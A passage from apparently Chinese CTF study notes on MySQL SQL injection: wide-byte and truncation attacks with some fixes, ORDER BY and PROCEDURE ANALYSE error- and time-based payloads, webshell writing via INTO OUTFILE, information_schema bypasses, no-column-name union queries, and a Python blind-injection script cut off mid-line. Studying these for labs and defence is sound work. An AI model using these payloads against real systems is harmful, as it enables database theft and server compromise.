</li><li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ul><blockquote><p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中, 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">输入：?username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span>c2<br><span class="hljs-operator">%</span>c2是Latin1字符集不存在的字符，<span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-operator">-</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>F可以直接表示某个字符、<span class="hljs-operator">%</span>C2<span class="hljs-operator">-</span><span class="hljs-operator">%</span>F4不可以直接表示某个字符而只是其他长字节编码结果的首字节。对于不完整的长字节UTF<span class="hljs-number">-8</span>编码的字符，进行字符集转换时会直接忽略，所以admin<span class="hljs-operator">%</span>c2会变成admin<br></code></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li><p>在调用 <strong>mysql_real_escape_string()</strong> 函数之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset&#x3D;(‘gbk’,$conn)</strong> 。</p></li><li><p>所以防止宽字节注入的另一个方法就是将 <strong>character_set_client</strong> 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); <br></code></pre></td></tr></table></figure><blockquote><p>当我们的MySQL收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。</p></blockquote></li></ul><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p><p>select 语句对于参数后面空格的处理是删除，insert只是截取最大长度的字符串，然后插入数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>username <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>),<br>  password <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure><p>最大长度限制(具体看表的定义)为25 我们输入用户名为 admin[20个空格]1,密码随意。脚本查询的时候因为用了select 语句，空格被删除，剩下了admin1。</p><p>注册时：INSERT取前25位-&gt;admin[20个空格]和自己设定的密码当成了一个新用户-&gt;select查找admin，返回两条</p><blockquote><p>数据库里面的空格也在查询的时候被删除了再比较</p></blockquote><h2 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];  <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>sort可以是sql语句，只要保证返回一行一列或者是一个数字或布尔类型也可以,一般有以下三种</p><ul><li><p>直接注入语句（要返回单行单列） ?sort&#x3D;(select ……)</p></li><li><p>利用函数rand ?sort&#x3D;rand(sql语句)</p><ul><li>利用的是rand(true)与rand(false)导致题目回显不同而构造盲注条件</li></ul><p>也可以用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure></li><li><p>利用and ?sort&#x3D;1 and(sql语句)</p><ul><li>这里的sql语句可以用延时注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure></li></ul><h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入 利用procedure analyse 参数，我们可以执行报错注入。</p><p>同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),con<br>cat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>); <br># 如果不支持报错注入的话，还可以基于时间注入：<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">PROCEDURE</span> analyse((<span class="hljs-keyword">select</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(IF(MID(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">LIKE</span> <span class="hljs-number">5</span>, BENCHMARK(<span class="hljs-number">5000000</span>,SHA1(<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>))))),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test<br>1.txt&quot;<br># 将查询结果导入到文件当中<br># 那这个时候我们可以考虑上传网马，利用lines terminated <span class="hljs-keyword">by</span><br><span class="hljs-keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0</span>x(网马进行<span class="hljs-number">16</span> 进制转<br>换)<br></code></pre></td></tr></table></figure><h2 id="六、常见bypass"><a href="#六、常见bypass" class="headerlink" title="六、常见bypass"></a>六、常见bypass</h2><p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">SQL注入绕过技巧 | 瓦都剋 (dropsec.xyz)</a></p><h3 id="Information-schema被屏蔽或过滤or时"><a href="#Information-schema被屏蔽或过滤or时" class="headerlink" title="Information_schema被屏蔽或过滤or时"></a>Information_schema被屏蔽或过滤or时</h3><p><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com)</a></p><h4 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h4><blockquote><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p></blockquote><h4 id="innodb表–查找当前数据库的现存表"><a href="#innodb表–查找当前数据库的现存表" class="headerlink" title="innodb表–查找当前数据库的现存表"></a><strong>innodb表</strong>–查找当前数据库的现存表</h4><p>MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # 返回去重过后的表名(简洁)<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # 返回值中会出现重复的表名<br></code></pre></td></tr></table></figure><h4 id="sys表"><a href="#sys表" class="headerlink" title="sys表"></a>sys表</h4><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">#包含<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="hljs-keyword">where</span> object_schema <span class="hljs-operator">=</span> database();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#不包含<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#通过表文件的存储路径获取表名<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><br>#查询指定库的表（若无则说明此表从未被访问）<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br>#统计所有访问过的表次数:库名,表名,访问次数<br><span class="hljs-keyword">select</span> table_schema,table_name,<span class="hljs-built_in">sum</span>(io_read_requests<span class="hljs-operator">+</span>io_write_requests) io <span class="hljs-keyword">from</span> sys.schema_table_statistics <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><br>table_schema,table_name <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> io <span class="hljs-keyword">desc</span>;<br>#查看所有正在连接的用户详细信息<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>,db,command,current_statement,last_statement,<span class="hljs-type">time</span> <span class="hljs-keyword">FROM</span> sys.session;<br>#查看所有曾连接数据库的IP,总连接次数<br><span class="hljs-keyword">SELECT</span> host,total_connections <span class="hljs-keyword">FROM</span> sys.host_summary;<br># 包含之前查询记录的表<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> sys.x$statement_analysis <span class="hljs-keyword">WHERE</span> QUERY REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> `sys`.`statement_analysis` <span class="hljs-keyword">where</span> QUERY REGEXP DATABASE();<br></code></pre></td></tr></table></figure><h4 id="performance-schema表"><a href="#performance-schema表" class="headerlink" title="performance_schema表"></a>performance_schema表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_handles` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br>#包含之前查询记录的表<br><span class="hljs-keyword">SELECT</span> digest_text <span class="hljs-keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="hljs-keyword">WHERE</span> digest_text REGEXP DATABASE();<br>#包含表文件路径的表<br><span class="hljs-keyword">SELECT</span> file_name <span class="hljs-keyword">FROM</span> `performance_schema`.`file_instances` <span class="hljs-keyword">WHERE</span> file_name REGEXP DATABASE();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232923.jpg" alt="image-20220707221836224"></p><blockquote><p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道flag所在的库和表名时，但无法获取到列名，就需要利用无列名盲注了</p></blockquote><h4 id="join无列名注入-payload"><a href="#join无列名注入-payload" class="headerlink" title="join无列名注入 payload"></a>join无列名注入 payload</h4><p><strong>join … using(xx)</strong></p><p>查表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_auto_increment_columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>Union all 与union 的区别是增加了去重的功能</p></blockquote><p>查列名(适用于逗号被过滤)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 重命名法<br><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> b, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span>;<br>#无逗号，有<span class="hljs-keyword">join</span>版本<br><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> `a`)m <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span> `b`)n <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span> `c`)t <span class="hljs-keyword">where</span> <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x;<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b)c<span class="hljs-comment">--+</span><br># 获取第一列的列名<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id,username))c<span class="hljs-comment">--+</span><br># 获取次列及后续列名<br></code></pre></td></tr></table></figure><h4 id="union-select重命名法"><a href="#union-select重命名法" class="headerlink" title="union select重命名法"></a><code>union select重命名法</code></h4><p>不获取列名情况下查列,以查第二列为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> group_concat(b) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)a;<br># 也可以查多个列<br><span class="hljs-keyword">select</span> concat(`<span class="hljs-number">2</span>`,<span class="hljs-number">0x2d</span>,`<span class="hljs-number">3</span>`) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span>;<br># <span class="hljs-number">0x2d</span>会转换成字符<span class="hljs-string">&#x27;-&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里将第二列取别名为b(如果反引号&#96;没被过滤，可以不取别名，直接用⬇️)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> ……<br></code></pre></td></tr></table></figure><p>结尾的a可以替换成任意字符，这是用来命名的</p><p>原理是联合查询时列名显示的是前一个select的结果，这里第一个select是<code>select 1,2 as b,3 </code>将列名重命名为1 b 3，然后再将这个新表命名为a，再进行查询</p></blockquote><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p><a href="https://www.freebuf.com/articles/web/275528.html">基于mysql8特性的sql注入 - FreeBuf网络安全行业门户</a></p><p>mysql 8.0.19<code>新增语句</code>table </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">table</span> users; <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><blockquote><p>table不能加where子句，不允许行过滤，显示所有列，但可以用来盲注表名</p></blockquote><h4 id="table盲注脚本"><a href="#table盲注脚本" class="headerlink" title="table盲注脚本"></a>table盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#orio1e</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>result=<span class="hljs-string">&#x27;0x&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>result+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">return</span> result<br>dic=[<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>,<br>         <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,]  <span class="hljs-comment"># 字典</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dic)):<br><span class="hljs-built_in">print</span>(dic[j])<br>url=<span class="hljs-string">&quot;http://127.0.0.1:8010&quot;</span><br><span class="hljs-comment">#第一个字段</span><br><span 